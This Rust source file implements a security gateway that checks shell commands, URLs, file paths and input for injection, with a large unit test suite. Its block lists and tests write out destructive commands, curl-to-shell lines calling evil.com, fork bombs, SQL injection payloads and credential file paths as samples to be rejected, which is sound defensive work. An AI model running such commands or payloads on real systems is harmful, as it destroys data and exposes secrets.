use anyhow::Result;
use regex::Regex;
use std::net::IpAddr;
use std::path::Path;
use std::sync::LazyLock;

static SQL_INJECTION_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"(?i)('\s*(OR|AND)\s+')").expect("valid regex"),
        Regex::new(r"(?i)(;\s*(DROP|DELETE|UPDATE|INSERT)\s+)").expect("valid regex"),
        Regex::new(r"(?i)(UNION\s+SELECT)").expect("valid regex"),
    ]
});

/// Security gateway that validates commands, URLs, file paths, and content.
/// Ported from the Electron SecurityGateway.
pub struct SecurityGateway {
    dangerous_commands: Vec<Regex>,
    risky_patterns: Vec<Regex>,
    allowed_domains: Vec<String>,
    blocked_path_prefixes: Vec<String>,
}

impl SecurityGateway {
    pub fn new() -> Self {
        Self {
            dangerous_commands: vec![
                Regex::new(r"(?i)\brm\s+-rf\s+/").expect("valid regex"),
                Regex::new(r"(?i)\bmkfs\b").expect("valid regex"),
                Regex::new(r"(?i)\bdd\s+if=").expect("valid regex"),
                Regex::new(r"(?i)>\s*/dev/sd[a-z]").expect("valid regex"),
                Regex::new(r"(?i)\bformat\s+[a-z]:").expect("valid regex"),
                Regex::new(r"(?i)\b(shutdown|reboot|halt|poweroff)\b").expect("valid regex"),
                Regex::new(r"(?i):\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:").expect("valid regex"), // fork bomb
                Regex::new(r"(?i)\bchmod\s+-R\s+777\s+/").expect("valid regex"),
                Regex::new(r"(?i)\bchown\s+-R\s+.*\s+/\s*$").expect("valid regex"),
                Regex::new(r"(?i)\bcurl\b.*\|\s*(ba)?sh").expect("valid regex"),
                Regex::new(r"(?i)\bwget\b.*\|\s*(ba)?sh").expect("valid regex"),
                Regex::new(r"(?i)\bdel\s+/s\s+/q\s+[a-z]:\\").expect("valid regex"),
                Regex::new(r"(?i)\brd\s+/s\s+/q\s+[a-z]:\\").expect("valid regex"),
                Regex::new(r"(?i)\bRemove-Item\s+.*-Recurse\s+-Force\s+[a-z]:\\").expect("valid regex"),
                Regex::new(r"(?i)\bdiskpart\b").expect("valid regex"),
            ],
            risky_patterns: vec![
                Regex::new(r"(?i);\s*(rm|del|format|mkfs)").expect("valid regex"),
                Regex::new(r"(?i)\$\(.*\)").expect("valid regex"),
                Regex::new(r"(?i)`[^`]+`").expect("valid regex"),
                Regex::new(r"(?i)\beval\b").expect("valid regex"),
            ],
            allowed_domains: vec![
                "github.com".into(),
                "raw.githubusercontent.com".into(),
                "api.github.com".into(),
                "registry.npmjs.org".into(),
                "crates.io".into(),
            ],
            blocked_path_prefixes: vec![
                ".ssh".into(),
                ".aws".into(),
                ".gnupg".into(),
                ".config/gcloud".into(),
                ".config\\gcloud".into(),
                "/etc/shadow".into(),
                "/etc/passwd".into(),
            ],
        }
    }

    /// Check if a shell command is safe to execute.
    pub fn check_command(&self, command: &str) -> Result<(), String> {
        for pattern in &self.dangerous_commands {
            if pattern.is_match(command) {
                return Err(format!("Blocked dangerous command: {command}"));
            }
        }
        for pattern in &self.risky_patterns {
            if pattern.is_match(command) {
                return Err(format!("Blocked risky pattern in command: {command}"));
            }
        }
        Ok(())
    }

    /// Validate a URL for fetching.
    pub fn check_url(&self, url: &str) -> Result<(), String> {
        // Must be HTTPS
        if !url.starts_with("https://") {
            return Err("Only HTTPS URLs are allowed".into());
        }

        // Parse host
        let parsed = url::Url::parse(url).map_err(|e| format!("Invalid URL: {e}"))?;
        let host = parsed.host_str().ok_or("URL has no host")?;

        // Block private IPs
        if self.is_private_host(host) {
            return Err(format!("Blocked private/local host: {host}"));
        }

        // Check domain allowlist
        if !self
            .allowed_domains
            .iter()
            .any(|d| host.ends_with(d.as_str()))
        {
            return Err(format!("Domain not in allowlist: {host}"));
        }

        Ok(())
    }

    /// Validate a file path for access.
    pub fn check_path(&self, path: &Path) -> Result<(), String> {
        let path_str = path.to_string_lossy();

        // Block system roots (Unix "/" and any Windows drive root like "C:\", "D:/", "E:")
        let is_root = path_str == "/"
            || (path_str.len() <= 3
                && path_str
                    .as_bytes()
                    .first()
                    .is_some_and(|b| b.is_ascii_alphabetic())
                && path_str.as_bytes().get(1) == Some(&b':'));
        if is_root {
            return Err("Access to system root is blocked".into());
        }

        // Block sensitive directories
        for prefix in &self.blocked_path_prefixes {
            if path_str.contains(prefix) {
                return Err(format!("Access to sensitive path blocked: {prefix}"));
            }
        }

        // Resolve to catch traversal — reject if path can't be resolved
        let resolved = path
            .canonicalize()
            .map_err(|_| format!("Cannot resolve path: {path_str}"))?;
        let resolved_str = resolved.to_string_lossy();
        for prefix in &self.blocked_path_prefixes {
            if resolved_str.contains(prefix) {
                return Err(format!(
                    "Path traversal to sensitive directory blocked: {prefix}"
                ));
            }
        }

        Ok(())
    }

    /// Check for common injection patterns in user input.
    pub fn check_injection(&self, input: &str) -> Result<(), String> {
        // SQL injection (patterns compiled once via LazyLock)
        for pat in SQL_INJECTION_PATTERNS.iter() {
            if pat.is_match(input) {
                return Err("Potential SQL injection detected".into());
            }
        }

        // Command injection — flag shell chaining operators in any input
        if input.contains("&&") || input.contains("||") || input.contains(';') {
            return Err("Potential command injection detected".into());
        }

        Ok(())
    }

    fn is_private_host(&self, host: &str) -> bool {
        if host == "localhost" || host.ends_with(".local") {
            return true;
        }
        if let Ok(ip) = host.parse::<IpAddr>() {
            return match ip {
                IpAddr::V4(v4) => {
                    v4.is_loopback()
                        || v4.is_private()
                        || v4.is_link_local()
                        || (v4.octets()[0] == 169 && v4.octets()[1] == 254)
                }
                IpAddr::V6(v6) => v6.is_loopback(),
            };
        }
        false
    }
}

impl Default for SecurityGateway {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn gw() -> SecurityGateway {
        SecurityGateway::new()
    }

    // ---------------------------------------------------------------
    // check_command: dangerous commands that MUST be blocked
    // ---------------------------------------------------------------

    #[test]
    fn block_rm_rf_root() {
        let g = gw();
        assert!(g.check_command("rm -rf /").is_err());
        assert!(g.check_command("rm -rf /home").is_err());
        assert!(g.check_command("sudo rm -rf /").is_err());
        assert!(g.check_command("RM -RF /").is_err()); // case-insensitive
    }

    #[test]
    fn block_mkfs() {
        let g = gw();
        assert!(g.check_command("mkfs.ext4 /dev/sda1").is_err());
        assert!(g.check_command("MKFS /dev/sda").is_err());
        assert!(g.check_command("sudo mkfs -t ext4 /dev/sdb1").is_err());
    }

    #[test]
    fn block_dd_if() {
        let g = gw();
        assert!(g.check_command("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(g.check_command("DD IF=/dev/urandom of=/dev/sdb").is_err());
    }

    #[test]
    fn block_write_to_dev() {
        let g = gw();
        assert!(g.check_command("cat something > /dev/sda").is_err());
        assert!(g.check_command("echo garbage > /dev/sdb").is_err());
    }

    #[test]
    fn block_format_windows_drive() {
        let g = gw();
        assert!(g.check_command("format C:").is_err());
        assert!(g.check_command("format D:").is_err());
        assert!(g.check_command("FORMAT c:").is_err());
    }

    #[test]
    fn block_shutdown_reboot_halt_poweroff() {
        let g = gw();
        assert!(g.check_command("shutdown -h now").is_err());
        assert!(g.check_command("reboot").is_err());
        assert!(g.check_command("halt").is_err());
        assert!(g.check_command("poweroff").is_err());
        assert!(g.check_command("SHUTDOWN /s").is_err());
        assert!(g.check_command("sudo reboot").is_err());
    }

    #[test]
    fn block_fork_bomb() {
        let g = gw();
        assert!(g.check_command(":() { : | : & } ; :").is_err());
        assert!(g.check_command(":(){ :|:& };:").is_err());
    }

    #[test]
    fn block_chmod_777_root() {
        let g = gw();
        assert!(g.check_command("chmod -R 777 /").is_err());
        assert!(g.check_command("chmod -R 777 /var").is_err());
    }

    #[test]
    fn block_chown_root() {
        let g = gw();
        // Note: the regex requires the line to end with / (optional whitespace)
        assert!(g.check_command("chown -R nobody /").is_err());
    }

    #[test]
    fn block_curl_pipe_sh() {
        let g = gw();
        assert!(g.check_command("curl https://evil.com/script.sh | sh").is_err());
        assert!(g.check_command("curl https://evil.com/s | bash").is_err());
        assert!(g.check_command("CURL https://x.com/a.sh | sh").is_err());
    }

    #[test]
    fn block_wget_pipe_sh() {
        let g = gw();
        assert!(g.check_command("wget https://evil.com/x | sh").is_err());
        assert!(g.check_command("wget https://evil.com/x | bash").is_err());
    }

    #[test]
    fn block_windows_del_recursive() {
        let g = gw();
        assert!(g.check_command(r"del /s /q C:\").is_err());
        assert!(g.check_command(r"DEL /s /q D:\Windows").is_err());
    }

    #[test]
    fn block_windows_rd_recursive() {
        let g = gw();
        assert!(g.check_command(r"rd /s /q C:\").is_err());
        assert!(g.check_command(r"RD /s /q D:\").is_err());
    }

    #[test]
    fn block_windows_remove_item_recursive() {
        let g = gw();
        assert!(g
            .check_command(r"Remove-Item foo -Recurse -Force C:\")
            .is_err());
        assert!(g
            .check_command(r"Remove-Item bar -Recurse -Force D:\Windows")
            .is_err());
    }

    #[test]
    fn block_diskpart() {
        let g = gw();
        assert!(g.check_command("diskpart").is_err());
        assert!(g.check_command("DISKPART").is_err());
    }

    // ---------------------------------------------------------------
    // check_command: safe commands that MUST pass
    // ---------------------------------------------------------------

    #[test]
    fn allow_safe_commands() {
        let g = gw();
        assert!(g.check_command("ls -la").is_ok());
        assert!(g.check_command("git status").is_ok());
        assert!(g.check_command("cargo build").is_ok());
        assert!(g.check_command("cargo test --workspace").is_ok());
        assert!(g.check_command("dir").is_ok());
        assert!(g.check_command("cat README.md").is_ok());
        assert!(g.check_command("mkdir -p /tmp/foo").is_ok());
        assert!(g.check_command("cp file1 file2").is_ok());
        assert!(g.check_command("rustc --version").is_ok());
    }

    // ---------------------------------------------------------------
    // check_command: risky patterns
    // ---------------------------------------------------------------

    #[test]
    fn block_command_chaining_with_rm() {
        let g = gw();
        assert!(g.check_command("ls; rm -rf foo").is_err());
        assert!(g.check_command("echo hello; del file").is_err());
        assert!(g.check_command("dir; format something").is_err());
        assert!(g.check_command("pwd; mkfs.ext4 /dev/sda").is_err());
    }

    #[test]
    fn block_command_substitution() {
        let g = gw();
        assert!(g.check_command("echo $(whoami)").is_err());
        assert!(g.check_command("cat $(find / -name passwd)").is_err());
    }

    #[test]
    fn block_backtick_execution() {
        let g = gw();
        assert!(g.check_command("echo `whoami`").is_err());
        assert!(g.check_command("ls `cat /etc/passwd`").is_err());
    }

    #[test]
    fn block_eval() {
        let g = gw();
        assert!(g.check_command("eval 'rm -rf /'").is_err());
        assert!(g.check_command("bash -c eval something").is_err());
    }

    #[test]
    fn allow_commands_without_risky_patterns() {
        let g = gw();
        assert!(g.check_command("echo hello world").is_ok());
        assert!(g.check_command("python script.py --flag=value").is_ok());
        assert!(g.check_command("npm install express").is_ok());
    }

    // ---------------------------------------------------------------
    // check_url: protocol enforcement
    // ---------------------------------------------------------------

    #[test]
    fn block_http_urls() {
        let g = gw();
        assert!(g.check_url("http://github.com/repo").is_err());
        assert!(g
            .check_url("http://github.com/repo")
            .unwrap_err()
            .contains("HTTPS"));
    }

    #[test]
    fn block_ftp_urls() {
        let g = gw();
        assert!(g.check_url("ftp://files.example.com/data").is_err());
    }

    #[test]
    fn block_no_scheme_urls() {
        let g = gw();
        assert!(g.check_url("github.com/repo").is_err());
    }

    // ---------------------------------------------------------------
    // check_url: allowed domains
    // ---------------------------------------------------------------

    #[test]
    fn allow_github_com() {
        let g = gw();
        assert!(g.check_url("https://github.com/owner/repo").is_ok());
    }

    #[test]
    fn allow_raw_githubusercontent() {
        let g = gw();
        assert!(g
            .check_url("https://raw.githubusercontent.com/owner/repo/main/file.txt")
            .is_ok());
    }

    #[test]
    fn allow_api_github() {
        let g = gw();
        assert!(g
            .check_url("https://api.github.com/repos/owner/repo")
            .is_ok());
    }

    #[test]
    fn allow_npmjs_registry() {
        let g = gw();
        assert!(g
            .check_url("https://registry.npmjs.org/express")
            .is_ok());
    }

    #[test]
    fn allow_crates_io() {
        let g = gw();
        assert!(g.check_url("https://crates.io/crates/serde").is_ok());
    }

    #[test]
    fn block_non_allowlisted_domain() {
        let g = gw();
        assert!(g.check_url("https://evil.com/malware").is_err());
        assert!(g
            .check_url("https://evil.com/malware")
            .unwrap_err()
            .contains("allowlist"));
        assert!(g.check_url("https://google.com/search").is_err());
        assert!(g.check_url("https://example.com/data").is_err());
    }

    // ---------------------------------------------------------------
    // check_url: private/local hosts blocked
    // ---------------------------------------------------------------

    #[test]
    fn block_localhost() {
        let g = gw();
        assert!(g.check_url("https://localhost/admin").is_err());
        assert!(g
            .check_url("https://localhost/admin")
            .unwrap_err()
            .contains("private"));
    }

    #[test]
    fn block_dot_local_domains() {
        let g = gw();
        assert!(g.check_url("https://myhost.local/api").is_err());
        assert!(g.check_url("https://printer.local/status").is_err());
    }

    #[test]
    fn block_loopback_ipv4() {
        let g = gw();
        assert!(g.check_url("https://127.0.0.1/secret").is_err());
    }

    #[test]
    fn block_private_10_network() {
        let g = gw();
        assert!(g.check_url("https://10.0.0.1/internal").is_err());
        assert!(g.check_url("https://10.255.255.255/data").is_err());
    }

    #[test]
    fn block_private_192_168_network() {
        let g = gw();
        assert!(g.check_url("https://192.168.1.1/router").is_err());
        assert!(g.check_url("https://192.168.0.100/admin").is_err());
    }

    #[test]
    fn block_link_local_169_254() {
        let g = gw();
        assert!(g.check_url("https://169.254.169.254/metadata").is_err());
        assert!(g.check_url("https://169.254.1.1/info").is_err());
    }

    #[test]
    fn block_ipv6_loopback() {
        let g = gw();
        // URL with IPv6 loopback: [::1]
        assert!(g.check_url("https://[::1]/secret").is_err());
    }

    // ---------------------------------------------------------------
    // check_path: system roots
    // ---------------------------------------------------------------

    #[test]
    fn block_unix_root() {
        let g = gw();
        assert!(g.check_path(Path::new("/")).is_err());
        assert!(g
            .check_path(Path::new("/"))
            .unwrap_err()
            .contains("root"));
    }

    #[test]
    fn block_windows_drive_roots() {
        let g = gw();
        assert!(g.check_path(Path::new("C:")).is_err());
        assert!(g.check_path(Path::new("D:")).is_err());
        assert!(g
            .check_path(Path::new("C:"))
            .unwrap_err()
            .contains("root"));
    }

    #[test]
    fn block_windows_drive_root_with_backslash() {
        let g = gw();
        // "C:\" is 3 bytes, starts with alpha, second byte is ':'
        assert!(g.check_path(Path::new(r"C:\")).is_err());
        assert!(g.check_path(Path::new(r"D:\")).is_err());
    }

    // ---------------------------------------------------------------
    // check_path: sensitive directories
    // ---------------------------------------------------------------

    #[test]
    fn block_ssh_directory() {
        let g = gw();
        let p = Path::new("/home/user/.ssh/id_rsa");
        let result = g.check_path(p);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains(".ssh"));
    }

    #[test]
    fn block_aws_directory() {
        let g = gw();
        let p = Path::new("/home/user/.aws/credentials");
        let result = g.check_path(p);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains(".aws"));
    }

    #[test]
    fn block_gnupg_directory() {
        let g = gw();
        let p = Path::new("/home/user/.gnupg/secring.gpg");
        let result = g.check_path(p);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains(".gnupg"));
    }

    #[test]
    fn block_gcloud_config_unix() {
        let g = gw();
        let p = Path::new("/home/user/.config/gcloud/credentials.json");
        let result = g.check_path(p);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("gcloud"));
    }

    #[test]
    fn block_gcloud_config_windows() {
        let g = gw();
        let p = Path::new(r"C:\Users\user\.config\gcloud\credentials.json");
        let result = g.check_path(p);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("gcloud"));
    }

    #[test]
    fn block_etc_shadow() {
        let g = gw();
        let result = g.check_path(Path::new("/etc/shadow"));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("/etc/shadow"));
    }

    #[test]
    fn block_etc_passwd() {
        let g = gw();
        let result = g.check_path(Path::new("/etc/passwd"));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("/etc/passwd"));
    }

    // ---------------------------------------------------------------
    // check_path: valid paths that should pass
    // ---------------------------------------------------------------

    #[test]
    fn allow_temp_dir() {
        let g = gw();
        let tmp = std::env::temp_dir();
        // temp_dir() always exists and is not a sensitive path
        assert!(
            g.check_path(&tmp).is_ok(),
            "temp_dir should be allowed: {:?}",
            tmp
        );
    }

    #[test]
    fn allow_existing_file_in_temp() {
        let g = gw();
        // Create a temporary file to test canonicalization succeeds
        let tmp = std::env::temp_dir();
        let test_file = tmp.join("hive_security_test.txt");
        std::fs::write(&test_file, "test").expect("write temp file");
        let result = g.check_path(&test_file);
        let _ = std::fs::remove_file(&test_file);
        assert!(result.is_ok(), "temp file should be allowed: {:?}", test_file);
    }

    #[test]
    fn reject_nonexistent_path() {
        let g = gw();
        // Canonicalize fails on paths that don't exist
        let bogus = PathBuf::from("/nonexistent/path/that/does/not/exist/xyz123");
        let result = g.check_path(&bogus);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Cannot resolve path"));
    }

    // ---------------------------------------------------------------
    // check_injection: SQL injection patterns
    // ---------------------------------------------------------------

    #[test]
    fn detect_sql_injection_or() {
        let g = gw();
        assert!(g.check_injection("' OR '1'='1").is_err());
        assert!(g
            .check_injection("' OR '1'='1")
            .unwrap_err()
            .contains("SQL injection"));
    }

    #[test]
    fn detect_sql_injection_and() {
        let g = gw();
        assert!(g.check_injection("' AND '1'='1").is_err());
    }

    #[test]
    fn detect_sql_injection_drop() {
        let g = gw();
        assert!(g.check_injection("; DROP TABLE users").is_err());
        assert!(g.check_injection("; drop table orders").is_err());
    }

    #[test]
    fn detect_sql_injection_delete() {
        let g = gw();
        assert!(g.check_injection("; DELETE FROM users").is_err());
    }

    #[test]
    fn detect_sql_injection_update() {
        let g = gw();
        assert!(g.check_injection("; UPDATE users SET admin=1").is_err());
    }

    #[test]
    fn detect_sql_injection_insert() {
        let g = gw();
        assert!(g.check_injection("; INSERT INTO users VALUES(1)").is_err());
    }

    #[test]
    fn detect_sql_injection_union_select() {
        let g = gw();
        assert!(g.check_injection("UNION SELECT * FROM passwords").is_err());
        assert!(g.check_injection("union select username from users").is_err());
    }

    // ---------------------------------------------------------------
    // check_injection: command injection
    // ---------------------------------------------------------------

    #[test]
    fn detect_command_injection_double_ampersand() {
        let g = gw();
        assert!(g.check_injection("foo && bar").is_err());
        assert!(g
            .check_injection("foo && bar")
            .unwrap_err()
            .contains("command injection"));
    }

    #[test]
    fn detect_command_injection_double_pipe() {
        let g = gw();
        assert!(g.check_injection("foo || bar").is_err());
    }

    #[test]
    fn detect_command_injection_semicolon() {
        let g = gw();
        assert!(g.check_injection("foo; bar").is_err());
    }

    // ---------------------------------------------------------------
    // check_injection: clean input that should pass
    // ---------------------------------------------------------------

    #[test]
    fn allow_clean_input() {
        let g = gw();
        assert!(g.check_injection("hello world").is_ok());
        assert!(g.check_injection("SELECT * FROM users WHERE id = 5").is_ok());
        assert!(g.check_injection("normal search query").is_ok());
        assert!(g.check_injection("filename.txt").is_ok());
        assert!(g.check_injection("user@example.com").is_ok());
        assert!(g.check_injection("2026-02-20").is_ok());
        assert!(g.check_injection("path/to/file").is_ok());
    }

    #[test]
    fn allow_single_pipe() {
        let g = gw();
        // A single pipe is fine (Unix pipe, not command injection)
        assert!(g.check_injection("some | thing").is_ok());
    }

    #[test]
    fn allow_single_ampersand() {
        let g = gw();
        // A single & is fine (background process, not injection)
        assert!(g.check_injection("some & thing").is_ok());
    }

    // ---------------------------------------------------------------
    // Default trait
    // ---------------------------------------------------------------

    #[test]
    fn default_creates_valid_gateway() {
        let g = SecurityGateway::default();
        // Should behave identically to new()
        assert!(g.check_command("ls").is_ok());
        assert!(g.check_command("rm -rf /").is_err());
        assert!(g.check_url("https://github.com/test").is_ok());
        assert!(g.check_url("http://evil.com").is_err());
        assert!(g.check_injection("clean text").is_ok());
        assert!(g.check_injection("' OR '1'='1").is_err());
    }

    #[test]
    fn default_has_all_allowed_domains() {
        let g = SecurityGateway::default();
        assert!(g.check_url("https://github.com/x").is_ok());
        assert!(g
            .check_url("https://raw.githubusercontent.com/x")
            .is_ok());
        assert!(g.check_url("https://api.github.com/x").is_ok());
        assert!(g.check_url("https://registry.npmjs.org/x").is_ok());
        assert!(g.check_url("https://crates.io/x").is_ok());
    }

    // ---------------------------------------------------------------
    // is_private_host (tested indirectly through check_url)
    // ---------------------------------------------------------------

    #[test]
    fn private_host_172_16_range() {
        let g = gw();
        // 172.16.0.0/12 is private
        assert!(g.check_url("https://172.16.0.1/admin").is_err());
        assert!(g.check_url("https://172.31.255.255/admin").is_err());
    }

    #[test]
    fn public_ip_not_blocked_but_domain_check_still_applies() {
        let g = gw();
        // A public IP is not private, but it won't be in the allowlist
        let result = g.check_url("https://8.8.8.8/dns");
        assert!(result.is_err());
        // The error should be about the domain allowlist, not about being private
        assert!(result.unwrap_err().contains("allowlist"));
    }

    // ---------------------------------------------------------------
    // Edge cases
    // ---------------------------------------------------------------

    #[test]
    fn empty_command_is_safe() {
        let g = gw();
        assert!(g.check_command("").is_ok());
    }

    #[test]
    fn empty_injection_input_is_safe() {
        let g = gw();
        assert!(g.check_injection("").is_ok());
    }

    #[test]
    fn case_insensitive_dangerous_commands() {
        let g = gw();
        assert!(g.check_command("RM -RF /").is_err());
        assert!(g.check_command("Mkfs.ext4 /dev/sda").is_err());
        assert!(g.check_command("DD IF=/dev/zero of=/dev/sda").is_err());
        assert!(g.check_command("DISKPART").is_err());
        assert!(g.check_command("Shutdown -h now").is_err());
    }

    #[test]
    fn case_insensitive_sql_injection() {
        let g = gw();
        assert!(g.check_injection("' or '1'='1").is_err());
        assert!(g.check_injection("' OR '1'='1").is_err());
        assert!(g.check_injection("union SELECT * FROM t").is_err());
        assert!(g.check_injection("; drop TABLE users").is_err());
    }

    #[test]
    fn dangerous_error_message_contains_command() {
        let g = gw();
        let cmd = "rm -rf /everything";
        let err = g.check_command(cmd).unwrap_err();
        assert!(
            err.contains(cmd),
            "Error message should contain the blocked command"
        );
    }

    #[test]
    fn risky_error_message_contains_command() {
        let g = gw();
        let cmd = "echo $(whoami)";
        let err = g.check_command(cmd).unwrap_err();
        assert!(
            err.contains(cmd),
            "Error message should contain the blocked command"
        );
    }

    #[test]
    fn url_error_non_https_message() {
        let g = gw();
        let err = g.check_url("http://github.com").unwrap_err();
        assert!(err.contains("HTTPS"), "Error should mention HTTPS");
    }

    #[test]
    fn url_error_private_host_message() {
        let g = gw();
        let err = g.check_url("https://localhost/x").unwrap_err();
        assert!(
            err.contains("private") || err.contains("local"),
            "Error should mention private/local"
        );
    }

    #[test]
    fn url_error_domain_not_allowed_message() {
        let g = gw();
        let err = g.check_url("https://evil.com/x").unwrap_err();
        assert!(
            err.contains("allowlist"),
            "Error should mention domain allowlist"
        );
    }

    #[test]
    fn path_error_root_message() {
        let g = gw();
        let err = g.check_path(Path::new("/")).unwrap_err();
        assert!(err.contains("root"), "Error should mention system root");
    }

    #[test]
    fn path_error_sensitive_message() {
        let g = gw();
        let err = g.check_path(Path::new("/home/user/.ssh/key")).unwrap_err();
        assert!(err.contains(".ssh"), "Error should mention the sensitive path");
    }

    #[test]
    fn injection_error_sql_message() {
        let g = gw();
        let err = g.check_injection("' OR '1'='1").unwrap_err();
        assert!(
            err.contains("SQL injection"),
            "Error should mention SQL injection"
        );
    }

    #[test]
    fn injection_error_command_message() {
        let g = gw();
        let err = g.check_injection("foo && bar").unwrap_err();
        assert!(
            err.contains("command injection"),
            "Error should mention command injection"
        );
    }
}
